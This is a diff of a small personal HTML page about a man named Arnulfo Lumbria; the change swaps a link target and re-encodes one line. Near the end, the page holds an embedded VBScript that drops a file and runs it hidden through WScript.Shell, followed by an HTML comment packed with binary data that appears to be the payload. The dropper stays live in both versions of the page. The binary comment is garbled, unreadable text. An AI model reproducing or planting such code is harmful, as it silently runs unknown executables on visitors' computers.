@@ -13,7 +13,7 @@ body{
 <body>
 <h1><center>FATHER</h1></center>
 <center><img src="papaP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<p><a href="content.php" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>ARNULFO</p>
 <p><front = 'Georgia'><b>Middle Name:</b>LUMBRIA</p>
@@ -39,4 +39,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--g#N?���4�ezH���J����'��o�2n9�*�k.��ƾ����;�n�I�D�����3q |�{x�D�6־:B;o��\�!�*�^A:b��*t�n�������c�GQG}�M� �v8��ZIJ\K�ص)|H� *�.�l-1�p�Ŗ���������j���S�p(�qi \ݫ݃}��<���"��l����5wr�>�i�}�i�p����}��Kп�A���j���`�����]X�.w+h.p��m+gJ�(�DeQV����*�4_�t@��l�7������5^��g�m�C���m���y��O����%`����u�(��2!_T���Øpek�o �-�O���.�~��C��&����R�Ÿ��7_B̗l�\4b�;��ꔓˊ����QC軭����ܚ~scؽ\�44�bN�T��2q��`�mh76P�G����� ��R(���������N�X<�� ��-->
+//--></SCRIPT><!--g#N?À4ýezH¡øJµ'¾»o2n9þ*åk.ÜëÆ¾àÑ;ÙnID¥ü Àì3q |â{x¦D6Ö¾:B;oÜÒ\ä!â*^A:bæ*tªn¾ÏÈü Äôc§GQG}¬M® »v8ÞÄZIJ\K¯Øµ)|HÝ *¥.Ôl-1ÊpÅûù©¤Á¥Õj³ñ²Sâp(qi \Ý«Ý}Ö<ÙÂÙ"¨láòÝ÷5wr¦>iº}i«pÔÙëý}®çKÐ¿A·³j¥Ïý`ùû¾®]X«.w+h.pØÎm+gJê(¤DeQV©ÏÃ*4_Ít@älÆ7ÃÓÀúÀ5^¼è¡gímãCâÇÍmâÒöyáà®O®»´Ç%`ûuÌ(±2!_TõåÃpekÐo - OøËÎ. ~¯¤C¨Ä&üø±¹RÊÅ¸±¦7_BÌlé\4b;ÌêËÍ¨çãQCè»­àÅ¯ÆÜ~scØ½\ª44ûbNöT×â2q`ä¹mh76PûGâø¦¼ ëÎR(ÕøëÎëÎëÎ¦N·X<èÎ ëÎ-->
